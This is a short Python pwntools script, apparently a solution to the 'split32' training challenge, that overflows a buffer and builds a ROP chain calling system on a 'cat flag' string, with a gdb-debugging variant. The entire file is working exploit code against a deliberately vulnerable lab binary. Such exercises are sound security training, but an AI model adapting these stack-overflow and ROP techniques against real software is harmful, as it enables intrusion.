#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-03-01 07:18:45
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *

context.arch = "i386"

filename = "./split32"
target_binary = ELF(filename)
target_process = process(filename)


def exploit():
    exploit_rop = ROP(target_binary)
    target_process.recvuntil(b">")
    trash = cyclic(0x28 + 4)
    cat_string_address = 0x0804a030
    call_system_address = 0x0804861a
    exploit_rop.raw(call_system_address)
    exploit_rop.raw(cat_string_address)
    chain = exploit_rop.chain()
    log.info(f"exploit_rop: ")
    print(exploit_rop.dump())
    target_process.send(trash + chain)
    target_process.interactive()


def debug():
    gdbscript = """
    break *0x080485f6
    start
    continue
    """
    gdb.attach(target_process, gdbscript=gdbscript)
    target_process.recvuntil(b">")
    trash = cyclic(0x28 + 4)
    cat_string_address = 0x0804a030
    call_system_address = 0x0804861a
    debug_rop = ROP(target_binary)
    debug_rop.raw(call_system_address)
    debug_rop.raw(cat_string_address)
    chain = debug_rop.chain()
    log.info(f"debug_rop: ")
    print(debug_rop.dump())
    target_process.send(trash + chain)
    target_process.interactive()


if __name__ == "__main__":
    # debug()
    exploit()
